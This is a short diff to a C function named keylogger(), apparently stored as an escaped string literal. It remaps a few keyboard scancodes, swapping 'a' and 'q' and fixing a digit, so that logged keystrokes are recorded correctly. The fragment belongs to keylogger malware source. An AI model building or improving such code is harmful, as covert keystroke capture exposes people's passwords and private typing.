@@ -86,7 +86,7 @@ void keylogger()\n\
 					write(log, \"8\", 1);\n\
 					break;\n\
 				case 10:\n\
-					write(log, \"0\", 1);\n\
+					write(log, \"9\", 1);\n\
 					break;\n\
 				case 11:\n\
 					write(log, \"0\", 1);\n\
@@ -104,7 +104,7 @@ void keylogger()\n\
 					write(log, \"\\t\", 1);\n\
 					break;\n\
 				case 16:\n\
-					write(log, \"a\", 1);\n\
+					write(log, \"q\", 1);\n\
 					break;	\n\
 				case 17:\n\
 					write(log, \"z\", 1);\n\
@@ -140,7 +140,7 @@ void keylogger()\n\
 					write(log, \"[CTRL]\", 6);\n\
 					break;\n\
 				case 30:\n\
-					write(log, \"q\", 1);\n\
+					write(log, \"a\", 1);\n\
 					break;\n\
 				case 31:\n\
 					write(log, \"s\", 1);\n\
